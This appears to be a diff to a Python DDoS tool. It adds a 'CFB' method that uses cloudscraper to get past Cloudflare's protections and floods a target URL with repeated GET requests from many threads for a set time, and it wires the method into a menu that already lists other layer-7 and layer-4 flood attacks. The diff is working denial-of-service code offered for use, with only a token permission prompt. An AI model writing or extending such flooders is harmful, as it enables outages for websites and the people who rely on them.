@@ -481,6 +481,24 @@ def AttackCFSOC(until_datetime, target, req):
         except:
             packet.close()
             pass
+
+def LaunchCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+        except:
+            pass
             
 #Layer4
 def runflooder(host, port, th, t):
@@ -676,7 +694,22 @@ def DdosCFSOC():
     else:
         print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
         sys.exit()
-        
+def DdosCFB():
+    target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Target Url : ")
+    thread = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Thread Count : ")
+    t = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input Attack Timer : ")
+    
+    print(f"\n{Fore.RED} [*] {Fore.RESET}Make sure you have permission from the site owner")
+    quest = input(Fore.RED+" [!] "+Fore.RESET+"Alert, Are you sure to attack (Y/N)? ")
+
+    if "Y" in quest.upper():
+        timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    else:
+        print(f"{Fore.RED} [*] {Fore.RESET}System Exit.")
+        sys.exit()
 
 def DdosUDP():
     target = input(Fore.MAGENTA+" [*] "+Fore.RESET+"Input IP Address : ")
@@ -785,7 +818,8 @@ def start():
         "HEAD      layer7 => Head Request Attack", 
         "SKY       layer7 => Sky method", 
         "CFREQ    layer7 => Bypass CF UAM, CAPTCHA, BFM (request)", 
-        "CFSOC    layer7 => Bypass CF UAM, CAPTCHA, BFM (socket)"
+        "CFSOC    layer7 => Bypass CF UAM, CAPTCHA, BFM (socket)", 
+        "CFB       layer7 => Bypass CF Attack
     ]
     DisplayMenu(menu)
     print() 
@@ -836,6 +870,9 @@ def start():
     elif indexSelect.upper() == "11":
         StartTitle(f"CFSocket Bypass DDoS")
         DdosCFSOC()
+    elif indexSelect.upper() == "12":
+        StartTitle(f"CF Bypass DDoS")
+        DdosCFB()
     else:
         print(f"{Fore.RED} [*] {Fore.RESET}Invalid menu")
         time.sleep(1) 
